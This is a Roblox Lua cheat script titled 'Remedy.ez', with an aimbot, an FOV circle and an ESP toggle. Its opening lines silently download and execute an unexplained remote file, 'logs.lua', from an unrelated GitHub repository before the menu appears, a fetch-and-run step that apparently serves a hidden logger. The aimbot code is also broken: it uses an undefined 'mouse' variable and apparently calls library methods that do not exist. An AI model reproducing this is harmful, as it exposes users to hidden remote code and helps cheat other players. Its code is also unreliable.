-- Import the external script
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"))()
end)

if not success then
    warn("Failed to load external script:", result)
else
    print("External script executed successfully.")
end

-- Import LinoriaLib components from GitHub
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

-- Load LinoriaLib components
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

-- Create the main window
local Window = Library:CreateWindow({
    Title = 'Remedy.ez | Private User',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})

-- Define Tabs
local Tabs = {
    Aim = Window:AddTab('Aim'),
    Visuals = Window:AddTab('Visuals'),
    Misc = Window:AddTab('Misc'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}

-- Add Aim settings to the Aim tab
local LeftGroupBoxAim = Tabs.Aim:AddLeftGroupbox('Aimbot Settings')

LeftGroupBoxAim:AddToggle('AimbotToggle', {
    Text = 'Enable Aimbot',
    Default = false,
    Tooltip = 'Enable or disable aimbot',
    Callback = function(Value)
        print('[cb] Aimbot Toggle changed to:', Value)
    end
})

LeftGroupBoxAim:AddToggle('ShowFOV', {
    Text = 'Show FOV Circle',
    Default = false,
    Tooltip = 'Shows the FOV circle for aimbot',
    Callback = function(Value)
        print('[cb] Show FOV changed to:', Value)
    end
})

LeftGroupBoxAim:AddSlider('FOVSize', {
    Text = 'FOV Size',
    Default = 100,
    Min = 50,
    Max = 500,
    Suffix = 'px',
    Rounding = 0,
    Tooltip = 'Adjust the size of the FOV for the aimbot',
    Callback = function(Value)
        print('[cb] FOV Size changed to:', Value)
    end
})

LeftGroupBoxAim:AddSlider('AimbotSmoothness', {
    Text = 'Aimbot Smoothness',
    Default = 5,
    Min = 1,
    Max = 20,
    Tooltip = 'Controls how smooth the aimbot snaps to targets',
    Callback = function(Value)
        print('[cb] Aimbot Smoothness changed to:', Value)
    end
})

-- Add Misc settings to the Misc tab
local LeftGroupBoxMisc = Tabs.Misc:AddLeftGroupbox('Misc Settings')

LeftGroupBoxMisc:AddSlider('CameraFOV', {
    Text = 'Camera FOV',
    Default = 70,
    Min = 10,
    Max = 120,
    Suffix = '°',
    Rounding = 0,
    Tooltip = 'Adjust the camera field of view',
    Callback = function(Value)
        local Camera = workspace.CurrentCamera
        Camera.FieldOfView = Value
        print('[cb] Camera FOV changed to:', Value)
    end
})

-- Add Visual settings to the Visuals tab
local LeftGroupBoxVisuals = Tabs.Visuals:AddLeftGroupbox('Visuals Settings')

LeftGroupBoxVisuals:AddToggle('ToggleBoxes', {
    Text = 'Toggle Enemy Boxes (ESP)',
    Default = false,
    Tooltip = 'Draw boxes around enemies',
    Callback = function(Value)
        print('[cb] Toggle Boxes changed to:', Value)
    end
})

-- Initialize Toggles and Options
local Toggles = {
    AimbotToggle = LeftGroupBoxAim:GetToggle('AimbotToggle'),
    ShowFOV = LeftGroupBoxAim:GetToggle('ShowFOV'),
    ToggleBoxes = LeftGroupBoxVisuals:GetToggle('ToggleBoxes'),
}

local Options = {
    FOVSize = LeftGroupBoxAim:GetSlider('FOVSize'),
    AimbotSmoothness = LeftGroupBoxAim:GetSlider('AimbotSmoothness'),
    CameraFOV = LeftGroupBoxMisc:GetSlider('CameraFOV'),
}

-- FOV Circle Drawing
local FOVCircle = Drawing.new("Circle")
FOVCircle.Thickness = 2
FOVCircle.Transparency = 1
FOVCircle.Color = Color3.fromRGB(0, 255, 0)
FOVCircle.Filled = false
FOVCircle.Visible = false

-- Update the FOV Circle
local function UpdateFOV()
    local mouse = game.Players.LocalPlayer:GetMouse()
    FOVCircle.Position = Vector2.new(mouse.X, mouse.Y + 36) -- Adjust for mouse position
    FOVCircle.Radius = Options.FOVSize.Value
    FOVCircle.Visible = Toggles.ShowFOV.Value
end

game:GetService('RunService').RenderStepped:Connect(UpdateFOV)

-- Check if the target is visible using raycasting
local function IsVisible(targetPart)
    local origin = game.Workspace.CurrentCamera.CFrame.Position
    local direction = (targetPart.Position - origin).Unit * (targetPart.Position - origin).Magnitude
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {game.Players.LocalPlayer.Character} -- Ignore local player
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local ray = game.Workspace:Raycast(origin, direction, raycastParams)
    return ray == nil -- If no obstruction, target is visible
end

-- Detect Right-Click Hold
local UserInputService = game:GetService('UserInputService')
local rightClickHeld = false

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = false
    end
end)

-- Aimbot Logic
local function Aimbot()
    if not Toggles.AimbotToggle.Value or not rightClickHeld then return end

    local camera = game.Workspace.CurrentCamera
    local localPlayer = game.Players.LocalPlayer
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Team ~= localPlayer.Team and player.Character and player.Character:FindFirstChild('Humanoid') and player.Character.Humanoid.Health > 0 then
            local targetPart = player.Character:FindFirstChild("HumanoidRootPart")
            if targetPart and IsVisible(targetPart) then
                local playerPos = targetPart.Position
                local screenPos = camera:WorldToScreenPoint(playerPos)
                local distance = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(mouse.X, mouse.Y)).Magnitude

                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    if closestPlayer then
        local targetPart = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetPart then
            local targetPos = camera:WorldToScreenPoint(targetPart.Position)
            mousemoverel((targetPos.X - mouse.X) / Options.AimbotSmoothness.Value, (targetPos.Y - mouse.Y) / Options.AimbotSmoothness.Value)
        end
    end
end

game:GetService('RunService').RenderStepped:Connect(Aimbot)

-- UI Settings
local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

MenuGroup:AddButton('Unload', function()
    Library:Unload()
end)

MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
    Default = 'End',
    NoUI = true,
    Text = 'Menu keybind'
})

Library.ToggleKeybind = Options.MenuKeybind -- Set the keybind for the menu

-- Addons: Setup ThemeManager and SaveManager
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

-- Set folders for saving themes and configs
ThemeManager:SetFolder('RemedyScript')
SaveManager:SetFolder('RemedyScript/specific-game')

-- Build config and theme menus
SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])

-- Load auto-load config
SaveManager:LoadAutoloadConfig()

-- Set watermark visibility and dynamic update
Library:SetWatermarkVisibility(true)

local FrameTimer = tick()
local FrameCounter = 0
local FPS = 60

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter
        FrameTimer = tick()
        FrameCounter = 0
    end

    Library:SetWatermark(('Remedy Softworks | %s fps | %s ms'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ))
end)

Library:OnUnload(function()
    WatermarkConnection:Disconnect()
    print('Unloaded!')
    Library.Unloaded = true
end)


-- Notification
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Remedy Softworks",
    Text = "Thanks for Using Remedy Softworks",
    Icon = "rbxassetid://113548811936137"
})
